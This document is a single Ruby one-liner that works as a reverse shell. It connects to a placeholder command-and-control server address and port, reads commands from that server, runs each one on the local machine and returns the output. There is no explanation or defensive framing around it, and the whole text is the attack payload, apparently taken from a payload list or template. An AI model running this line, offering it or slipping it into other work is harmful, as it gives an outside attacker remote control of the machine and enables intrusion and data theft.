ruby -rsocket -e 'c=TCPSocket.new("XX_CC_SERVER_IP","XX_PORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'